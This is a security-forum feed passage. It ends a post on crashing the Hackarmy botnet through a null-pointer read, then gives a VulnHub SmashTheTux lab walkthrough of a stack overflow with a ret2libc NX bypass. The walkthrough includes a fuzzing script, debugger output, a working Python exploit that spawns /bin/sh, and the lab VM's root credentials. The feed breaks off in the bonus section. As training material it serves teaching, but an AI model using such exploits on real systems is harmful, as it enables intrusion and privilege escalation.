<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/3e86852ead1206c91475236cba06d4cb0f35e9bd.png" data-download-href="/uploads/short-url/8V7OjfHEutv01TkDT25IjLL1Stn.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3e86852ead1206c91475236cba06d4cb0f35e9bd.png" alt="resim" data-base62-sha1="8V7OjfHEutv01TkDT25IjLL1Stn" width="690" height="312"></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/faf1db322af4fffe8708f2d7828736aad301c6a2.png" data-download-href="/uploads/short-url/zNXxCetCT7fVLnMPOsnjuEWrAX0.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/faf1db322af4fffe8708f2d7828736aad301c6a2.png" alt="resim" data-base62-sha1="zNXxCetCT7fVLnMPOsnjuEWrAX0" width="484" height="146"></a></div><p></p>
<p>But what happened exactly? By definition, the function <em>strstr()</em> returns <em>zero</em> if no occurences found.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/305d2f8e292d4849b39742be27511e79f20c9473.png" data-download-href="/uploads/short-url/6TQzdZW7uqnR39XXJsje00FLdK3.png?dl=1" title="resim"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/305d2f8e292d4849b39742be27511e79f20c9473.png" alt="resim" data-base62-sha1="6TQzdZW7uqnR39XXJsje00FLdK3" width="690" height="64"></a></div><p></p>
<p>Afterward the malware tried to calculate beginning of message body: <em>address_of_first_occurence+2</em> which is actually <em>0+2</em> since <em>strstr()</em> returned a null pointer. Then it tried to read from address <strong>0x2</strong>. Since this address is reserved for kernel it is inaccessible by a userland application. Operating system noticed this read attempt and <strong>crashed</strong> the application as a way of telling it to mind its own damn business <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<p>So this was the vulnerability I found. No need to say that I have passed the assessment <img src="https://d.clarkee.co.uk/images/emoji/twitter/joy.png?v=15" title=":joy:" class="emoji" alt=":joy:" loading="lazy" width="20" height="20"><br>
You may watch the video below if you would like to see a live demonstration!</p>
<p><a href="https://www.youtube.com/watch?v=952tJ8oDlgE">burnit4</a></p>

<p>I hope you enjoyed this thread see you in the next one <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/crashing-hackarmy-botnet/16738">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/crashing-hackarmy-botnet/16738</link>
          <pubDate>Sun, 06 Oct 2019 17:02:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-16738</guid>
          <source url="https://d.clarkee.co.uk/t/crashing-hackarmy-botnet/16738.rss">Crashing Hackarmy Botnet</source>
        </item>
        <item>
          <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
          <dc:creator><![CDATA[petruknisme]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>SmasTheTux is Vulnerable VM hosted by <a href="https://vulnhub.com" rel="noopener nofollow ugc">VulnHub</a> and created by <a href="https://canyoupwn.me/smashthetux-vm/" rel="noopener nofollow ugc">CanYouPwnMe</a></p>
<h4><a name="p-44170-disclaimer-1" class="anchor" href="https://d.clarkee.co.uk#p-44170-disclaimer-1"></a>Disclaimer</h4>
<p>This is for educational purpose and I will try to explain this tutorial with beginner-friendly explanation as I can.</p>
<p>SmashTheTux is a new VM made by <a href="http://canyoupwn.me" rel="noopener nofollow ugc">canyoupwn.me</a> for those who wants to take a step into the world of binary exploitation. This VM consists of 9 challenges, each introducing a different type of vulnerability. SmashTheTux covers basic exploitation of the following weaknesses:</p>
<ul>
<li>Stack Overflow Vulnerability</li>
<li>Off-by-One Vulnerability</li>
<li>Integer Overflow</li>
<li>Format String Vulnerability</li>
<li>Race Conditions</li>
<li>File Access Weaknesses</li>
<li>Heap Overflow Vulnerability</li>
</ul>
<p>VM Description:</p>
<pre><code class="lang-auto">Name........: SmashTheTux: 1.0.1
Date Release: 1 Apr 2016
Author......: CanYouPwn.Me
Series......: SmashTheTux
Objective...: Leveling up from user
Tester(s)...: h1tch1
Twitter.....: https://twitter.com/D4rk36
Credential..: tux:tux,root:1N33dP0w3r
Filename....: SmashTheTux_v1.0.1.7z
File size...: 616 MB
MD5.........: 63FEDA288163D9155B1BF84D1C6C2814
SHA1........: 01DCB1AB85B139A386AD97B41190731509612F59

</code></pre>
<p>Download link: <a href="https://www.vulnhub.com/entry/smashthetux-101,138/" class="inline-onebox" rel="noopener nofollow ugc">SmashTheTux: 1.0.1 ~ VulnHub</a></p>
<p><strong>Summary</strong></p>
<p>In this first series, I will cover two topic:</p>
<ul>
<li>Bypassing NX using ret2libc</li>
<li>Exploiting with execstack enable</li>
</ul>
<h4><a name="p-44170-initial-setup-2" class="anchor" href="https://d.clarkee.co.uk#p-44170-initial-setup-2"></a><strong>Initial Setup</strong></h4>
<p>Login to SmasTheTux VM using Virtualbox, VMWare or other virtualization clients with the above credentials and then get the IP address from that for easy access:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f43e2a1a62a65e1fb7e4e81899fc8bd388347fcc.png" data-download-href="/uploads/short-url/yQFGKB7w4GU2wfE8tMsD8SABLWI.png?dl=1" title="tux-login" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f43e2a1a62a65e1fb7e4e81899fc8bd388347fcc.png" alt="tux-login" data-base62-sha1="yQFGKB7w4GU2wfE8tMsD8SABLWI" width="690" height="180"></a></div><p></p>
<h4><a name="p-44170-ssh-3" class="anchor" href="https://d.clarkee.co.uk#p-44170-ssh-3"></a><strong>SSH</strong></h4>
<p>We will use ssh for remoting the VM because it’s easy to use rather than debugging in the VM without scroll function, copy paste and other function.</p>
<pre data-code-wrap="bash"><code class="lang-bash">ssh tux@192.168.2.125
The authenticity of host '192.168.2.125 (192.168.2.125)' can't be established.
ECDSA key fingerprint is SHA256:f/.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.125' (ECDSA) to the list of known hosts.
                            _    _            _._ 
                          .|_|_,' |          /_ _`. 
                          |       |          (.X.)| 
                          `|`'`-._|          |\_/'| 
                           | |               )____`\ 
                           | |              //_V _\ \ 
                           | |             ((  |  `(_) 
                           | |            / \&gt; '   / \ 
                           | |            \  \.__./  / 
                           | |             `-'    `-' 
                           | |
                          |` |
                          `--'
         __                     _    _____ _         _____            
        / _\_ __ ___   __ _ ___| |__/__   \ |__   __/__   \_   ___  __
        \ \| '_ ` _ \ / _` / __| '_ \ / /\/ '_ \ / _ \/ /\/ | | \ \/ /
        _\ \ | | | | | (_| \__ \ | | / /  | | | |  __/ /  | |_| |&gt;  &lt; 
        \__/_| |_| |_|\__,_|___/_| |_\/   |_| |_|\___\/    \__,_/_/\_\
                                                                      
                                                by canyoupwn.me

tux@192.168.2.125's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Jul  8 10:10:30 2019
tux@tux:~$ 

</code></pre>
<p>After successful login, we can see a list of files and tutorials for completing these challenges:</p>
<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~$ ls -al
total 288
drwxr-xr-x 12 tux  tux   4096 Mar 12  2016 .
drwxr-xr-x  3 root root  4096 Mar 11  2016 ..
drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x00
drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x01
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x02
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x03
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x04
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x05
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x06
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x07
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x08
drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x09
lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .bash_history -&gt; /dev/null
-rw-r--r--  1 tux  tux    220 Mar 11  2016 .bash_logout
-rw-r--r--  1 tux  tux   3545 Mar 11  2016 .bashrc
lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .nano_history -&gt; /dev/null
-rw-r--r--  1 tux  tux    675 Mar 11  2016 .profile
-rw-r--r--  1 tux  tux    679 Mar 12  2016 README
-rw-r--r--  1 tux  tux  20871 Mar 12  2016 TUTORIAL_formatstring
-rw-r--r--  1 tux  tux  91044 Mar 11  2016 TUTORIAL_heapoverflow
-rw-r--r--  1 tux  tux  27657 Mar 11  2016 TUTORIAL_integerbugs
-rw-r--r--  1 tux  tux  18657 Mar 11  2016 TUTORIAL_offbyone
-rw-r--r--  1 tux  tux  60996 Mar 11  2016 TUTORIAL_stackoverflow
</code></pre>
<p>For someone who have experienced with <a href="https://exploit.education/protostar/" rel="noopener nofollow ugc">Protostar</a>, this machine challenges is identical with that.</p>
<h4><a name="p-44170-level-0x00-4" class="anchor" href="https://d.clarkee.co.uk#p-44170-level-0x00-4"></a><strong>Level 0x00</strong></h4>
<p>We have binary file with the source code available:</p>
<pre data-code-wrap="c"><code class="lang-c">// gcc pwnme.c -o pwnme -fno-stack-protector
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vuln( char * arg ) {
        char buf[256];
        strcpy(buf, arg);
}

int main(int argc, char **argv) {
        printf("Val: %s\n", argv[1]);
        vuln(argv[1]);

        return 0;
}
</code></pre>
<p>The above code consist of vulnerable function:</p>
<ul>
<li><code>main()</code> function take the input as <code>argv[1]</code> and the pass the value to <code>vuln()</code> function</li>
<li><code>char buf[256]; </code>define the buf variable with 256 bytes in length.</li>
<li><code>strcpy(buf, arg);</code> copying buffer from <code>main()</code> to <code>arg</code> variable</li>
</ul>
<p>We know that <code>strcpy(3)</code> is a very unsafe function call in the C library and we should use <code>strlcpy(3)</code> or <code>snprintf</code>instead.</p>
<p>Why? Because by default no check for the size of data that will fit in the local buffer and blindly copies the data.</p>
<p><strong>Fuzzing</strong></p>
<p>We know that maximum length is 256 bytes for the user input defined before. We can use little python script for fuzzing the input in case we don’t know the offset address:</p>
<pre data-code-wrap="python"><code class="lang-python"># tux@tux:~/0x00$ cat fuzz.py
import os

buffer=["A"]
counter=100

while len(buffer) &lt;= 30:
    buffer.append("A" * counter)
    counter=counter+100

for string in buffer:
    print("Fuzzing %s bytes" % len(string))
    os.system("./pwnme %s" % string) 
</code></pre>
<p>Explanation:</p>
<ul>
<li>Define first buffer as 100 bytes and then increase by 100 bytes per loop</li>
<li>Copy buffer to program parameter as an argument</li>
</ul>
<p>It will show this result:</p>
<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ python fuzz.py 
Fuzzing 1 bytes
Val: A
Fuzzing 100 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Fuzzing 200 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Fuzzing 300 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
Fuzzing 400 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
Fuzzing 500 bytes
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

------- long result cut ----------
</code></pre>
<p>From the above result, the program starting to crash/segmentation fault when we use 300 bytes as the input parameter. But what number exactly trigger that segfault? How to find the missing one? Let’s use gdb-peda for doing this job. I will prefer gdb-peda instead of gdb for easy to use and more friendly.</p>
<p><strong>Install Gdb-Peda</strong></p>
<p>Don’t forget to check if gdb is existed in the machine before using gdb-peda.</p>
<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ gdb -v
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i586-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word".
</code></pre>
<p>Because of a limited package in the remote machine, we need to download gdb-peda in local and then copy to the server using SCP or FTP.</p>
<pre><code class="lang-auto"># in host machine
git clone https://github.com/longld/peda.git /home/user/peda
scp -r /home/user/peda tux@192.168.2.125:/home/tux

# from the tux machine
echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
</code></pre>
<p>We can check if peda is successfully installed with just running the gdb and see the result:</p>
<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ gdb ./pwnme 
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i586-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./pwnme...(no debugging symbols found)...done.
gdb-peda$ 
</code></pre>
<p>Nah, we have <code>gdb-peda</code> installed. Let’s do some check for binary security of that file. This is the first thing that I would do when starting Linux binary exploitation:</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre>
<p>Hm… NX is enabled. So, what this means is that we can’t execute our payload/shellcode in stack address because of NX(Non-Executable stack) prevention. Since the processor is not allowed to execute instructions placed on the stack.</p>
<p>In order to bypass this mechanism, We can use <code>ret2lib</code>(return to libc or return to the C library) technique. In the simple definition, this attack doesn’t require any shellcode to take control of the target vulnerable process because we can invoke classic built-in functions such as “system, exit, etc”.</p>
<p>For more information about ret2libc, you can look at <a class="mention" href="https://d.clarkee.co.uk/u/ioth1nkn0t">@IoTh1nkN0t</a> explanation <a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833" rel="noopener nofollow ugc">https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833</a></p>
<p><strong>Finding Patterns</strong></p>
<p>As we know that our program crash when using 300 bytes as input parameter, this is will be our clue for creating a pattern and finding the right offset with gdb-peda.</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
</code></pre>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
Starting program: /home/tux/0x00/pwnme 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
Val: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff4b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
EBX: 0xbffff5f0 --&gt; 0x2 
ECX: 0xbffff8e0 ("A%5A%KA%gA%6A%")
EDX: 0xbffff5ce ("A%5A%KA%gA%6A%")
ESI: 0x0 
EDI: 0x0 
EBP: 0x64254148 ('HA%d')
ESP: 0xbffff5c0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
EIP: 0x41332541 ('A%3A')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41332541
[------------------------------------stack-------------------------------------]
0000| 0xbffff5c0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0004| 0xbffff5c4 ("eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0xbffff5c8 ("A%JA%fA%5A%KA%gA%6A%")
0012| 0xbffff5cc ("%fA%5A%KA%gA%6A%")
0016| 0xbffff5d0 ("5A%KA%gA%6A%")
0020| 0xbffff5d4 ("A%gA%6A%")
0024| 0xbffff5d8 ("%6A%")
0028| 0xbffff5dc --&gt; 0xb7e3fa00 (&lt;__libc_start_main+144&gt;:       mov    esi,DWORD PTR [eax+0x1d0])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 i
</code></pre>
<p>Aha! We got a signal from our Lord with SIGSEGV(Segmentation Fault). From my experience, this is a possible signal to overflow the buffer. We get the offset at the end of result <code>0x41332541</code>.</p>
<p>We can check information register for EIP, EBP, ESP:</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$  i r eip esp ebp
eip            0x41332541       0x41332541
esp            0xbffff5c0       0xbffff5c0
ebp            0x64254148       0x64254148
</code></pre>
<p>What’s next? checking the correct offset address:</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ pattern offset 0x41332541
1093870913 found at offset: 268
</code></pre>
<p>Now, this is what we got so far:</p>
<ul>
<li>EIP Offset 0x41332541</li>
<li>Offset Number 268</li>
<li>NX Enabled.</li>
</ul>
<p><strong>Exploiting with NX Enabled</strong></p>
<p>First, We need to check if ASLR is enabled or not</p>
<pre><code class="lang-auto">$ cat /proc/sys/kernel/randomize_va_space
0
</code></pre>
<p>Good, ASLR is disabled for this machine. So, it will be easy for us because the address space value is not dynamically changed.</p>
<pre><code class="lang-auto">tux@tux:~/0x00$ ldd pwnme
        linux-gate.so.1 (0xb7ffd000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
        /lib/ld-linux.so.2 (0x80000000)
tux@tux:~/0x00$ ldd pwnme
        linux-gate.so.1 (0xb7ffd000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
        /lib/ld-linux.so.2 (0x80000000)
tux@tux:~/0x00$ ldd pwnme
        linux-gate.so.1 (0xb7ffd000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
        /lib/ld-linux.so.2 (0x80000000)
</code></pre>
<p>As we can see “libc” address is the same every time we check with ldd.</p>
<p><strong>Finding Functions Address</strong></p>
<p>For this purpose, We only need <code>system()</code>, <code>/bin/sh</code>, and <code>exit()</code> function. We will use system function and passing a shell as an argument and then invoke the exit function in order to terminate our system call. Start the program first.</p>
<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ start
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xb7fcf000 --&gt; 0x1a8da8 
ECX: 0xbffff730 --&gt; 0x1 
EDX: 0xbffff754 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff718 --&gt; 0x0 
ESP: 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
EIP: 0x804845a (&lt;main+15&gt;:      mov    ebx,ecx)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048456 &lt;main+11&gt;: mov    ebp,esp
   0x8048458 &lt;main+13&gt;: push   ebx
   0x8048459 &lt;main+14&gt;: push   ecx
=&gt; 0x804845a &lt;main+15&gt;: mov    ebx,ecx
   0x804845c &lt;main+17&gt;: mov    eax,DWORD PTR [ebx+0x4]
   0x804845f &lt;main+20&gt;: add    eax,0x4
   0x8048462 &lt;main+23&gt;: mov    eax,DWORD PTR [eax]
   0x8048464 &lt;main+25&gt;: sub    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
0004| 0xbffff714 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
0008| 0xbffff718 --&gt; 0x0 
0012| 0xbffff71c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
0016| 0xbffff720 --&gt; 0x80484a0 (&lt;__libc_csu_init&gt;:      push   ebp)
0020| 0xbffff724 --&gt; 0x0 
0024| 0xbffff728 --&gt; 0x0 
0028| 0xbffff72c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x0804845a in main ()
</code></pre>
<p>After that, we can find the address we need.</p>
<pre><code class="lang-auto">gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f85a69 ("/bin/sh")
gdb-peda$ p &amp;exit
$1 = (&lt;text variable, no debug info&gt; *) 0xb7e571b0 &lt;__GI_exit&gt;
gdb-peda$ p &amp;system
$2 = (&lt;text variable, no debug info&gt; *) 0xb7e643e0 &lt;__libc_system&gt;
</code></pre>
<p>Explanation:</p>
<ul>
<li>system() address is 0xb7e643e0</li>
<li>exit() address is 0xb7e571b0</li>
<li>/bin/sh address 0xb7f85a69</li>
</ul>
<p><strong>Creating Payload</strong></p>
<p>We can use this formula from the information we gathered before:</p>
<blockquote>
<p>Bytes Offset + System Address + Exit Address + Shell Address</p>
</blockquote>
<pre><code class="lang-auto">268 + 0xb7e643e0 + 0xb7e571b0 + 0xb7f85a69
</code></pre>
<p>We can use python for doing exploitation</p>
<pre data-code-wrap="bash"><code class="lang-bash"># cat bypass_nx.py
from struct import *

buf = ""
buf += "X" * (268)
buf += pack("&lt;L",0xb7e643e0) #system() address
buf += pack("&lt;L",0xb7e571b0) #exit() address
buf += pack("&lt;L",0xb7f85a69 ) #/bin/sh call address
print buf
</code></pre>
<p>Time to exploit</p>
<pre><code class="lang-auto">tux@tux:~/0x00$ ./pwnme $(python bypass_nx.py)
Val: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�C淰q��iZ��
$ ps
  PID TTY          TIME CMD
  816 pts/0    00:00:00 bash
 1092 pts/0    00:00:00 pwnme
 1094 pts/0    00:00:00 sh
 1098 pts/0    00:00:00 ps
$ echo $0
/bin/sh
</code></pre>
<p>Horrraaaayyyyyyyyy! We can spawn new shell. <img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/partying_face.png?v=15" title=":partying_face:" class="emoji" alt=":partying_face:" loading="lazy" width="20" height="20"></p>
<blockquote>
<p>In the end, We will return to libc</p>
</blockquote>
<p><strong>[BONUS] Exploiting with NX Disable</strong></p>
<p>By default, the program compiled with NX protection and not allowed for executes the payload in stack address. For this bonus section, we can recompile using <code>execstack</code> parameter for gcc.</p>
<pre><code class="lang-auto">mv pwnme pwnme-nx
